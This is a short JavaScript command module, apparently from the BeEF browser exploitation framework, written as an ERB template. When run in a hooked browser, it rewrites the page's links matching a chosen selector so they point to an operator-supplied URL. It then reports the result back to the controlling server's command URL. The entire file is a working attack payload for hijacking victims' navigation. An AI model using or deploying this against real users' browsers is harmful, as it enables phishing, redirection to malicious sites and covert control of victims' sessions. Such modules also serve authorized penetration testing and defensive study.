beef.execute(function() {
    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+beef.dom.rewriteLinks('<%= @url %>', '<%= @selector %>')+' links rewritten to <%= @url %>');
});

